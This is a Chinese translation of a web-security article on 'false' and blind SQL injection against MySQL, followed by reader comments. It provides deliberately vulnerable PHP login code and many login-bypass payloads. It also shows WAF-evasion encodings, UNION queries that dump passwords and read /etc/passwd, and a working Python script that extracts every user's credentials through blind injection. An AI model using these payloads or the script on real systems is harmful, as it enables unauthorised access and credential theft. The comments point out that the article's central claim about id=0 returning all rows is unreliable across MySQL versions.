@@ -1,0 +1,317 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">False SQL Injection and Advanced Blind SQL Injection</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Knight</a> <span class="bull">·</span> <time title="2014/12/15 10:21" ui-time="" datetime="2014/12/15 10:21" class="published ng-binding ng-isolate-scope">2014/12/15 10:21</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>原文地址：http://www.exploit-db.com/papers/18263/</p><p>这篇文章是为介绍一种新的绕过web防火墙或安全解决方案的SQL注入的方法而编写的。我（原文作者，下同）在一些韩国的防火墙上做了测试，大部分都能成功，我不会为减少影响而透露所测试的web防火墙的制造商。</p><p>阅读本文档之前你需要先了解基本的MySQL原理。我将“SQL注入”归类为两类。第一类是一般的SQL注入，即我们通常所说的“真SQL注入”，第二类是“假SQL注入”。在本文档中，你将了解到一些“真SQL注入”的特点。</p><h1>0x01 准备</h1><hr><p>我的方法（假SQL注入）与“盲注”中提到的真/假SQL注入的方法是真的不同的。测试的环境如下。</p><pre><code>ubuntu server   11.04
+mySQL       5.1.54-1
+Apache      2.2.17
+PHP     5.3.5-1
+</code></pre><p>测试代码如下。</p><pre><code>#!php
+&lt;?php
+
+/*
+create database injection_db;
+use injection_db;
+create table users(num int not null, id varchar(30) not null, password varchar(30) not null, primary key(num));
+
+insert into users values(1, 'admin', 'ad1234');
+insert into users values(2, 'wh1ant', 'wh1234');
+insert into users values(3, 'secuholic', 'se1234');
+
+*** login.php ***
+*/
+
+if(empty($_GET['id']) || empty($_GET['password'])){
+  echo "&lt;html&gt;";
+  echo "&lt;body&gt;";
+  echo "&lt;form name='text' action='login.php' method='get'&gt;";
+  echo "&lt;h4&gt;ID&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;input type='text' name='id'&gt;&lt;br&gt;";
+  echo "PASS&lt;input type='password' name='password'&gt;&lt;br&gt;&lt;/h4&gt;";
+  echo "&lt;input type='submit' value='Login'&gt;";
+  echo "&lt;/form&gt;";
+  echo "&lt;/body&gt;";
+  echo "&lt;/html&gt;";
+}
+
+else{
+  $id = $_GET['id'];
+  $password = $_GET['password'];
+
+  $dbhost = 'localhost';
+  $dbuser = 'root';
+  $dbpass = 'pass';
+  $database = 'injection_db';
+
+  $db = mySQL_connect($dbhost, $dbuser, $dbpass);
+  mySQL_select_db($database,$db);
+  $SQL = mySQL_query("select * from users where id='$id' and password='$password'") or die (mySQL_error());
+
+  $row = mySQL_fetch_array($SQL);
+
+  if($row[id] &amp;&amp; $row[password]){
+    echo "&lt;font color=#FF0000&gt;&lt;h1&gt;"."Login sucess"."&lt;/h1&gt;&lt;/u&gt;&lt;br&gt;";
+    echo "&lt;h3&gt;&lt;font color=#000000&gt;"."Hello, "."&lt;/u&gt;";
+    echo "&lt;font color=#D2691E&gt;".$row[id]."&lt;/u&gt;&lt;/h3&gt;&lt;br&gt;";
+  }
+  else{
+    echo "&lt;script&gt;alert('Login failed');&lt;/script&gt;";
+  }
+  mySQL_close($db);
+}
+
+?&gt;
+</code></pre><p>首先，基本的SQL注入如下</p><pre><code>' or 1=1#
+
+The code above is general SQL Injection Code, and this writer classified the code as "True SQL Injection". When you log on to some site, in internal of web program, your id and password are identified by some statement used "select id, password from table where id='' and password='', you can easily understand when you think 0 about character single quotation mark. Empty space is same as 0, the attack is possible using = and 0. As a result, following statement enables log on process.
+</code></pre><p>上面的代码是一般的SQL注入代码，我将这类代码归为“真SQL注入”。当你登录网站的时候，在网站的内部程序中，你的ID和密码会被一些语句用"select id, password from table where id='' and password=''"识别，如果你把单引号当做0你可以很容易地理解。空的空间与0是相等的，攻击可以使用‘=’和‘0’。这样一来，下面的语句就能完成登录过程。</p><pre><code>'=0#
+</code></pre><p>我们可以以不同的方式运用它。</p><p>因为0>-1，这一句也能成功。</p><pre><code>'&gt;-1#
+</code></pre><p>同样的，因为0&lt;1，所以这一句也能成功。</p><pre><code>'&lt;1#
+</code></pre><p>你不必只使用单一的数字。你可以像下面一样使用两个数字攻击。</p><pre><code>1'&lt;99#
+</code></pre><p>Comparison operation 0=1 will be 0, the following operation result is true because of id=''=0(0=1). 比较操作“0=1”的结果将会是0，又因为id=''=0，所以以下的操作结果是真。</p><pre><code>'=0=1#
+</code></pre><p>此外，还可以使用一些比较动作能使得两边的值相等。</p><pre><code>'&lt;=&gt;0#
+</code></pre><p>像这样，如果你使用比较操作，你可以用额外的方式进行攻击。</p><pre><code>'=0=1=1=1=1=1#
+'=1&lt;&gt;1#
+'&lt;&gt;1#
+1'&lt;&gt;99999#
+'!=2!=3!=4#
+</code></pre><h1>0x02 不同的SQL操作</h1><hr><p>现在，你将开始理解False SQL injection。以下为MySQ操作，不是攻击语句。</p><pre><code>mySQL&gt; select * from users;
++-----+-----------+----------+
+| num | id        | password |
++-----+-----------+----------+
+|   1 | admin     | ad1234   |
+|   2 | wh1ant    | wh1234   |
+|   3 | secuholic | se1234   |
++-----+-----------+----------+
+3 rows in set (0.01 sec)
+</code></pre><p>毫无疑问，它显示了所有表中的返回内容。 以下是当你不输入任何值在id字段时的返回内容。</p><pre><code>mySQL&gt; select * from users where id='';
+Empty set (0.00 sec)
+</code></pre><p>因为在id字段没有任何字符串，所以不会有返回结果。 事实上，从这里我已经看到，如果在MySQL字符串字段为0的情况下，返回结果始终为真。根据这个现象，以下语句结果为真。</p><pre><code>mySQL&gt; select * from users where id=0;
++-----+-----------+----------+
+| num | id        | password |
++-----+-----------+----------+
+|   1 | admin     | ad1234   |
+|   2 | wh1ant    | wh1234   |
+|   3 | secuholic | se1234   |
++-----+-----------+----------+
+3 rows in set (0.00 sec)
+</code></pre><p>如果你在ID中输入0，所有内容都将被显示。这就是假SQL注入的原理。无论如何，结果为0（真）将使得登录成功。为了使结果为0（真），你需要一些东西处理整数，如使用位操作和算术运算。</p><p>下面是使用位运算的例子。</p><p>或位运算为任何程序员所熟知。正如我之前告诉过你的，''等于0。如果你计算“0或0”，结果还是0. 所以下面的假SQL注入能成功登录。</p><pre><code>'|0#
+</code></pre><p>当然，你也可以使用和运算。</p><pre><code>'&amp;0#
+</code></pre><p>这是使用异或运算的攻击方法</p><pre><code>'^0#
+</code></pre><p>同样可以使用移位操作。</p><pre><code>'&lt;&lt;0#
+'&gt;&gt;0#
+</code></pre><p>如果你喜欢使用位操作，你可以使用多种不同的攻击方法。</p><pre><code>'&amp;''#
+'%11&amp;1#
+'&amp;1&amp;1#
+'|0&amp;1#
+'&lt;&lt;0|0#
+'&lt;&lt;0&gt;&gt;0#
+</code></pre><p>下面是使用算术运算的“假SQL注入”。 如果使用带有''的算术运算的结果为0，攻击将会成功。下面是一个使用算术运算的例子。</p><pre><code>'*9#
+乘法
+
+'/9#
+除法
+
+'%9#
+求余
+
+'+0#
+加法
+
+'-0#
+减法
+</code></pre><p>关键点在于结果必须小于1。你也可以使用如下语句攻击。</p><pre><code>'+2+5-7#
+'+0+0-0#
+'-0-0-0-0-0#
+'*9*8*7*6*5#
+'/2/3/4#
+'%12%34%56%78#
+'/**/+/**/0#
+'-----0#
+'+++0+++++0*0#
+</code></pre><p>下一种攻击方法使用的是函数功能。在这篇文章中，我无法向你们展示所有的函数。这个攻击方式并不难，所以你们可以使用函数进行你们想要的真/假SQL攻击。而这种攻击是“真SQL注入”或是“假SQL注入”取决于函数返回后的最后一个操作。</p><pre><code>'&lt;hex(1)#
+'=left(0x30,1)#
+'=right(0,1)#
+'!=curdate()#
+'-reverse(0)#
+'=ltrim(0)#
+'&lt;abs(1)#
+'*round(1,1)#
+'&amp;left(0,0)#
+'*round(0,1)*round(0,1)#
+</code></pre><p>此外，您还可以将空格做为函数名进行攻击。但你只能在某些函数中使用空格。</p><pre><code>'=upper     (0)#
+</code></pre><p>这一次，SQL的关键字是方法。这种方法根据情况视作为真或假SQL注入。</p><pre><code>' &lt;1 and 1#
+'xor 1#
+'div 1#
+'is not null#
+admin' order by'
+admin' group by'
+'like 0#
+'between 1 and 1#
+'regexp 1#
+</code></pre><p>在id或password区域中没有额外注释的很可能是真的假SQL注入。一般的web防火墙只过滤#, --, /**/,因此该方法在web防火墙中更有效。</p><pre><code>ID  : '='
+PASS: '='
+
+ID  : '&lt;&gt;'1
+PASS: '&lt;&gt;'1
+
+ID  : '&gt;1='
+PASS: '&gt;1='
+
+ID  : 0'='0
+PASS: 0'='0
+
+ID  : '&lt;1 and 1&gt;'
+PASS: '&lt;1 and 1&gt;'
+
+ID  : '&lt;&gt;ifnull(1,2)='1
+PASS: '&lt;&gt;ifnull(1,2)='1
+
+ID  : '=round(0,1)='1
+PASS: '=round(0,1)='1
+
+ID  : '*0*'
+PASS: '*0*'
+
+ID  : '+'
+PASS: '+'
+
+ID  : '-'
+PASS: '-'
+
+ID  :'+1-1-'
+PASS:'+1-1-'
+</code></pre><p>使用文本的攻击比使用括号的攻击在绕过web防火墙时会更有效。</p><pre><code>'+(0-0)#
+'=0&lt;&gt;((reverse(1))-(reverse(1)))#
+'&lt;(8*7)*(6*5)*(4*3)#
+'&amp;(1+1)-2#
+'&gt;(0-100)#
+</code></pre><h1>0x03 绕过</h1><p>让我们来看看一般的SQL注入攻击。</p><pre><code>' or 1=1#
+</code></pre><p>如果被转换为16进制编码，将会是这样的。</p><pre><code>http://127.0.0.1/login.php?id=%27%20%6f%72%20%31%3d%31%23&amp;password=1234
+</code></pre><p>像上面的攻击基本都会被过滤。因此它不是好的攻击方法，我将尝试使用tab(%09)代替空格绕过过滤器。事实上。你还可以使用%a0代替%09</p><p>也可以使用以下的值。</p><pre><code>%09
+%0a
+%0b
+%0c
+%0d
+%a0
+%23%0a
+%23%48%65%6c%6c%6f%20%77%6f%6c%72%64%0a
+</code></pre><p>以下是使用％A0代替％20的例子。</p><pre><code>http://127.0.0.1/login.php?id=%27%a0%6f%72%a0%31%3d%31%23&amp;password=1234
+</code></pre><p>这一次，我将展示盲注的攻击方法，这种攻击可以绕过web防火墙过滤器，但一些攻击者倾向于认为盲注不可能实现登录。所以我决定展示这个例子。</p><p>下面的攻击代码能被用来登录页面且页面将显示ID和密码</p><pre><code>'union select 1,group_concat(password),3 from users#
+</code></pre><p>这个攻击代码将显示/etc/password的内容。</p><pre><code>'union select 1,load_file(0x2f6574632f706173737764),3 from users#
+</code></pre><p>我敢说在盲注中不使用union select也是可以的。</p><p>记录的结果有三个。</p><pre><code>admin' and (select count(*) from users)=3#
+</code></pre><p>让我们使用盲注绕过web防火墙。以下是一份有存在盲注漏洞的代码</p><pre><code>#!php
+&lt;?php
+
+  /*** info.php ***/
+
+  $n = $_GET['num'];
+  if(empty($n)){
+    $n = 1;
+  }
+
+  $dbhost = 'localhost';
+  $dbuser = 'root';
+  $dbpass = 'root';
+  $database = 'injection_db';
+
+  $db = mySQL_connect($host, $dbuser, $dbpass);
+  mySQL_select_db($database,$db);
+  $SQL = mySQL_query("select * from `users` where num=".$n) or die (mySQL_error());
+  $info = @mySQL_fetch_row($SQL);
+  echo "&lt;body bgcolor=#000000&gt;";
+  echo "&lt;h1&gt;&lt;font color=#FFFFFF&gt;wh1ant&lt;/font&gt;";
+  echo "&lt;font color=#2BF70E&gt; site for blind SQL injection test&lt;/h1&gt;&lt;br&gt;";
+  echo "&lt;h1&gt;&lt;font color=#2BF70E&gt;num: &lt;/font&gt;&lt;font color=#D2691E&gt;".$info[0]."&lt;/font&gt;&lt;/h1&gt;";
+  echo "&lt;h1&gt;&lt;font color=#2BF70E&gt;user: &lt;/font&gt;&lt;font color=#D2691E&gt;".$info[1]."&lt;/font&gt;";
+  echo "&lt;body&gt;";
+  mySQL_close($db);
+
+?&gt;
+</code></pre><p>像上面那样的基本的盲注如下。</p><pre><code>http://127.0.0.1/info.php?num=1 and 1=0
+http://127.0.0.1/info.php?num=1 and 1=1
+</code></pre><p>在Blind SQL Injection可以使用运算符=。</p><pre><code>http://192.168.137.129/info.php?num=1=0
+http://192.168.137.129/info.php?num=1=1
+</code></pre><p>自然也能使用其它的运算符。</p><pre><code>http://127.0.0.1/info.php?num=1&lt;&gt;0
+http://127.0.0.1/info.php?num=1&lt;&gt;1
+
+http://127.0.0.1/info.php?num=1&lt;0
+http://127.0.0.1/info.php?num=1&lt;1
+
+http://127.0.0.1/info.php?num=1*0*0*1
+http://127.0.0.1/info.php?num=1*0*0*0
+
+http://127.0.0.1/info.php?num=1%1%1%0
+http://127.0.0.1/info.php?num=1%1%1%1
+
+http://127.0.0.1/info.php?num=1 div 0
+http://127.0.0.1/info.php?num=1 div 1
+
+http://127.0.0.1/info.php?num=1 regexp 0
+http://127.0.0.1/info.php?num=1 regexp 1
+
+http://127.0.0.1/info.php?num=1^0
+http://127.0.0.1/info.php?num=1^1
+</code></pre><p>攻击示例：</p><pre><code>http://127.0.0.1/info.php?num=0^(locate(0x61,(select id from users where num=1),1)=1)
+http://127.0.0.1/info.php?num=0^(select position(0x61 in (select id from users where num=1))=1)
+http://127.0.0.1/info.php?num=0^(reverse(reverse((select id from users where num=1)))=0x61646d696e)
+http://127.0.0.1/info.php?num=0^(lcase((select id from users where num=1))=0x61646d696e)
+http://127.0.0.1/info.php?num=0^((select id from users where num=1)=0x61646d696e)
+http://127.0.0.1/info.php?num=0^(id regexp 0x61646d696e)
+http://127.0.0.1/info.php?num=0^(id=0x61646d696e)
+http://127.0.0.1/info.php?num=0^((select octet_length(id) from users where num=1)=5)
+http://127.0.0.1/info.php?num=0^((select character_length(id) from users where num=1)=5)
+
+If I will show all attack, I have to take much time, So I stopped in this time. Blind SQL Injection is difficult manually, So using tool will be more effective. I will show a tool made python, this is an example using ^(XOR) bitwise operation. In order to make the most of detouring the web firewall, I replaced space with %0a.
+</code></pre><p>展示所有的攻击过程将会浪费我大量的时间，所以到此为止。手工盲注是很困难的，所以使用工具会更有效。下面是一个python写的工具，这是一个使用异或运算的例子。为了绕过大多数的web防火墙，我将空格换成了%0a。</p><pre><code>#!python
+
+### blind.py ###
+
+import urllib
+import sys
+import os
+
+
+
+def put_data(true_url, true_result, field, index, length):
+    for i in range(1, length+1):
+        for j in range(32, 127):
+            attack_url = true_url + "^(%%a0locate%%a0%%a0(0x%x,(%%a0select%%a0%s%%a0%%a0from%%a0%%a0users%%a0where%%a0num=%d),%d)=%d)" % (j,field,index,i,i)
+            attack_open = urllib.urlopen(attack_url)
+            attack_result = attack_open.read()
+            attack_open.close()
+
+            if attack_result==true_result:
+                ch = "%c" % j
+                sys.stdout.write(ch)
+                break
+    print "\t\t",
+
+def get_length(false_url, false_result, field, index):
+    i=0
+    while 1:
+        data_length_url = false_url + "^(%%a0(select%%a0octet_length%%a0%%a0(%s)%%a0from%%a0users%%a0where%%a0num%%a0=%%a0%d)%%a0=%%a0%d)" % (field,index,i)
+        data_length_open = urllib.urlopen(data_length_url)
+        data_length_result = data_length_open.read()
+        data_length_open.close()
+        if data_length_result==false_result:
+            return i
+        i+=1
+
+url = "http://127.0.0.1/info.php"
+
+true_url = url + "?num=1"
+true_open = urllib.urlopen(true_url)
+true_result = true_open.read()
+true_open.close()
+
+false_url = url + "?num=0"
+false_open = urllib.urlopen(false_url)
+false_result = false_open.read()
+false_open.close()
+
+
+print "num\t\tid\t\tpassword"
+fields = "num", "id", "password"
+
+for i in range(1, 4):
+    for j in range(0, 3):
+        length = get_length(false_url, false_result, fields[j], i)
+        length = put_data(false_url, true_result, fields[j], i, length)
+    print ""
+</code></pre><p>很遗憾，攻击测试很快就停止了。如果有人学过一些额外的攻击代码，他将很容易地升级攻击。</p><p>韩文原版http://wh1ant.kr/archives/[Hangul]%20False%20SQL%20injection%20and%20Advanced%20blind%20SQL%20injection.txt</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20150526182619d30b198a6ab3c4477cc2cecfd7cd0f84.png" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2015-05-08 11:14:33</span></div><p></p><p>mysql&gt;use test<br>mysql&gt;create table t<br>(<br>num int not null check(num !=&#039;&#039;),<br>name char(10) not null,<br>pass char(10) not null<br>)engine=innodb default charset=utf8 auto_increment=1;<br>填坑。<br>mysql&gt;insert into t(num,name,pass) values(1,&#039;admin&#039;,&#039;password&#039;);<br>mysql&gt;select * from t where name=&#039;admin&#039;;<br>mysql&gt;select * from t where name=0;<br>以上为测试代码，mysql6.05测试成功。注意测试的字段不能为数字型。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小菜大师</span> <span class="reply-time">2014-12-19 21:32:36</span></div><p></p><p>当id设置字符型：select * from admin where id=0和select * from admin where id=&quot;0&quot;只有当0不添加引号的时候才会被当做bool的真假关系，加了的话，被按照字符执行了<br>当id设置整形的时候：id=0和id=&quot;0&quot;成立吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">shack2</span> <span class="reply-time">2014-12-19 14:12:38</span></div><p></p><p>我表示在5.6.19-log，select * from admin where id=&#039;0&#039;，select * from admin where id=0都不能返回数据。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-17 13:20:40</span></div><p></p><p>原作者似乎也误以为可以查到所有数据的样子。<br>感谢。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Vigoss_Z</span> <span class="reply-time">2014-12-17 11:03:41</span></div><p></p><p>所有的疑惑可以看小钉子的留言，正解。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小钉子</span> <span class="reply-time">2014-12-17 10:09:31</span></div><p></p><p>1 因为字符字段和数字比较的时候,会进行类型转换.mysql下测试select &#039;a&#039;=0;可以看到有一个警告.<br>Truncated incorrect DOUBLE value: &#039;a&#039;<br>但是最终上面表达式的值为1.因为a转换double失败了.但double的默认值本来就是0,所以0=0.0=0是真,而不是说0是真<br>2 =0并不能查出所有数据.只能查出所有转换数字失败的行数.<br>比如数据为数字,或者数字开头的,根据mysql转换规则,是可以转为数字的,这类数据用上面的=0查询是查询不到的.同理比如字段内为&#039;-3123test&#039;等值的时候&gt;-1也不能查出来,因为他可以转换为-3123.</p><p>mysql里1为true 0为false</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-16 18:31:27</span></div><p></p><p>select * from admin where id=&#039;0&#039;<br>select * from admin where id=0<br>这两句sql是完全不一样的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-16 18:30:28</span></div><p></p><p>不是返回true，而是语句可以运行。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-16 18:29:06</span></div><p></p><p>你看错了一个地方。不是select * from admin where id=&#039;0&#039;<br>而是select * from admin where id=0</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-16 18:22:25</span></div><p></p><p>原作者的环境下这样会返回所有内容。<br>mySQL&gt; select * from users where id=0;<br>+-----+-----------+----------+<br>| num | id | password |<br>+-----+-----------+----------+<br>| 1 | admin | ad1234 |<br>| 2 | wh1ant | wh1234 |<br>| 3 | secuholic | se1234 |<br>+-----+-----------+----------+<br>3 rows in set (0.00 sec)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">欧阳天天</span> <span class="reply-time">2014-12-16 14:47:52</span></div><p></p><p>where id = &#039;&#039; = 0<br>问了下dba，mysql里可以执行，不过不符合sql92标准</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小飞</span> <span class="reply-time">2014-12-16 12:02:48</span></div><p></p><p>翻译这篇文章。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">爱捣蛋的鬼</span> <span class="reply-time">2014-12-16 09:29:34</span></div><p></p><p>那我字段值是不是不能为了0了。。为0一查都查出来了，感觉不对头吗</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">isno</span> <span class="reply-time">2014-12-16 09:07:10</span></div><p></p><p>字符串字段=0，这种表达式会返回true，什么逻辑？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">姿势不行</span> <span class="reply-time">2014-12-16 08:54:02</span></div><p></p><p>select * from admin where id=&#039;0&#039;<br>这样是返回0行的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-15 23:27:05</span></div><p></p><p>设计问题，感觉和环境有关。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mctrain</span> <span class="reply-time">2014-12-15 22:41:44</span></div><p></p><p>弱弱地问下，为什么</p><p>“select * from users where id=0</p><p>可以返回所有的结果啊？这个是因为mysql的设计就是这样子的吗？不太能理解啊~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-15 18:39:45</span></div><p></p><p>哪部分失败了？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-15 18:19:22</span></div><p></p><p>select * from admin where id=&#039;&#039;<br>相当于select * from admin where id=&#039;0&#039;可以正常运行，即结果为真。<br>id=&#039;0&#039;，0&gt;-1<br>就是这样。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Knight</span> <span class="reply-time">2014-12-15 18:16:52</span></div><p></p><p>我会努力的翻的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">姿势不行</span> <span class="reply-time">2014-12-15 16:15:50</span></div><p></p><p>感谢 学到了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Th1nk</span> <span class="reply-time">2014-12-15 14:33:54</span></div><p></p><p>几个问题<br>1.为何0是真？<br>2.既然0是真，那么&#039;&#039;&gt;-1为何也可以？<br>(&#039;&#039;&gt;-1) = true吧？<br>这么说 true=0?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">beastk</span> <span class="reply-time">2014-12-15 13:38:13</span></div><p></p><p>感觉翻译有点晦涩</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-12-15 12:31:07</span></div><p></p><p>恩,手抖了...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">迦南</span> <span class="reply-time">2014-12-15 12:11:27</span></div><p></p><p>SCTF吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-12-15 11:22:32</span></div><p></p><p>如果没记错,SSCTF用到这个玩意了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2014-12-15 10:55:04</span></div><p></p><p>PHP Version 5.3.29+ win test fail!</p><p></p></div></div></div></div></div></main>
